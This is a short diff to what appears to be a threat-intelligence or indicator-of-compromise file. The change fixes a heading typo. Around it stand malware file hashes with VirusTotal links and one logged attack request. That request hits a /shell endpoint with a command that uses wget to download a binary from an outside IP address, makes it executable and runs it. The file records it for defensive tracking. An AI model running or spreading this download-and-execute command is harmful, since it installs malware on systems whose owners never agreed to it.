@@ -22,7 +22,7 @@ https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d9
 71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
 https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 /shell?cd+/tmp;+rm+-rf+shk;+wget+http:/\\/103.163.214.97/shk;+chmod+777+shk;+./shk+jaws;+rm+-rf+shk
 
